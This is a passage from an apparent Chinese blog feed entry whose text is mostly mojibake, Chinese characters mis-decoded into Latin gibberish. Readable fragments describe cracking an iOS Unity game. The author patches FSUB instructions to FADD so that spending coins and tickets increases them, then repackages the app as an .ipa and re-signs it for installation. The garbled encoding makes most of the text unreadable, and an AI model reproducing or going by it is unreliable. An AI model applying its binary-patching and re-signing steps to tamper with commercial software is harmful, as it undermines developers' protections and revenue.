src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcnKkHB5rmPAMzZB5mVkiGJvg.png"></p><p>å¯ä»¥çœ‹åˆ°å¢åŠ é’±çš„é€»è¾‘ï¼Œæ˜¯æŸ¥è¯¢ç°æœ‰çš„é’±ç„¶ååŠ ä¸Šè·å¾—çš„é’±ï¼Œè¿™é‡Œä¿®æ”¹çš„è¯å°±ä¼šé€ æˆä¸€ä¸ªé—®é¢˜ï¼ï¼ï¼åˆå§‹åŒ–çš„æ—¶å€™é’±ä¸º 0.ä¸å¤ªå¥½æ”¹åŠ¨ï¼Œæ‰€ä»¥æˆ‘æ‰“ç®—æ”¹åŠ¨äº†èŠ±è´¹å¤„</p><p><img src="/sboxcnPkalcvB4EGjGtobm8QO1Lg.png"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘æŠŠèŠ±è´¹æ—¶åº”è¯¥-coin çš„ä½ç½®æ”¹æˆäº† +coinï¼Œè¿™æ ·çš„è¯æ¯æ¬¡èŠ±é’±éƒ½ä¼šä»·é’±ï¼Œè¾¾åˆ°äº†ä¸€ä¸ªä¿®æ”¹é‡‘é’±çš„ç›®çš„</p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcnHQ0fZiEBkztENJWLUvNRpd.png"></p><p>æ”¹æ³•æ¯”è¾ƒç®€å•ï¼ŒæŠŠåŸæœ¬ FSUB æ”¹æˆ FADD å°±å¯ä»¥äº†ï¼Œé™¤äº†é’±è¿˜æœ‰ä¸ªæ–°å‡ºçš„æ¨¡å¼ æœˆçƒæ¨¡å¼</p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcnMw4S8i3IwH7yPhVMPaKXie.png"></p><p>è¿™ä¸ªä¹Ÿæ˜¯ä¸€ç§é’ç¥¨ï¼Œæˆ‘ä»¬ç”¨åŒæ ·çš„æ–¹å¼è¿›è¡Œé€†å‘</p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcnHHYqNfT6fSCBfILVSgOkue.png"></p><p>åˆçœ‹åˆ°ç†Ÿæ‚‰çš„ ADD å’Œ Costï¼ŒåŒæ ·å‡æ”¹æˆåŠ </p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcngxewsshIQZWUU7WVuc2bre.png"></p><p>æ”¹æ³•ç›¸åŒ FSUB æ”¹æˆ FADD</p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcnOqTyizqMdPAhYZDUwHZZtf.png"></p><h2 id="æ‰“åŒ…é‡ç­¾å"><a href="#æ‰“åŒ…é‡ç­¾å" class="headerlink" title="æ‰“åŒ…é‡ç­¾å"></a>æ‰“åŒ…é‡ç­¾å</h2><p>è¿™ä¸ªè¿‡ç¨‹æ–¹æ³•æœ‰å¤ªå¤šå¤ªå¤šï¼Œè¿™é‡Œä¸ºäº†èƒ½å°½å¿«ç©ä¸Šæ¸¸æˆï¼Œæˆ‘ä»¬å°±èµ°æœ€æœ´å®æ— åçš„è·¯çº¿ã€‚</p><p>é¦–å…ˆå°† patched åçš„æ¸¸æˆæ–‡ä»¶æ›¿æ¢æ‰åŸæœ¬çš„æ–‡ä»¶</p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcn85zIE4jPqwOQpFs34t50vc.png"></p><p>æŠŠè¯¥æ–‡ä»¶å¤åˆ¶åˆ°å¯¹åº”ä½ç½®ï¼Œå¹¶ä¸”è¿›å…¥è¿™ä¸ªä½ç½®ï¼Œå³é”®å‹ç¼©æ–‡ä»¶</p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcn4va9IAGB96jX3K2ALaCv4d.png"></p><p>å‹ç¼©åï¼Œé‡å‘½å Payload.zip ä¸º Payload.ipa</p><p>æ‰“å¼€çˆ±æ€åŠ©æ‰‹ï¼ï¼ï¼ï¼Œä½¿ç”¨é‡Œé¢çš„ç­¾åå·¥å…·</p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcniyY5OAGkwqvNpc8dQirz7c.png"></p><p>ç­¾åå®Œæˆåï¼Œå°±èƒ½å®‰è£…ä½¿ç”¨äº†</p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcn468hrv1wyvIDPVhopTFDBd.png"></p><p>å®‰è£…å³å¯</p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcnmoH9OE4T9C8bGEJGfmlC7g.png"></p><h2 id="æˆåŠŸæˆªå›¾"><a href="#æˆåŠŸæˆªå›¾" class="headerlink" title="æˆåŠŸæˆªå›¾"></a>æˆåŠŸæˆªå›¾</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;æ¸¸æˆä»‹ç»&quot;&gt;&lt;a href=&quot;#æ¸¸æˆä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;æ¸¸æˆä»‹ç»&quot;&gt;&lt;/a&gt;æ¸¸æˆä»‹ç»&lt;/h2&gt;&lt;p&gt;ç‰ˆæœ¬ï¼š1.2.4&lt;br&gt;è®¾å¤‡ï¼šxsmax&lt;br&gt;æ¸¸æˆç¯å¢ƒï¼šUnity&lt;/p&gt;</summary>
    
    
    
    <category term="é€†å‘å·¥ç¨‹" scheme="http://ioo0s.art/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    
    <category term="iosé€†å‘" scheme="http://ioo0s.art/tags/ios%E9%80%86%E5%90%91/"/>
    
    <category term="æ¸¸æˆç ´è§£" scheme="http://ioo0s.art/tags/%E6%B8%B8%E6%88%8F%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
</feed>
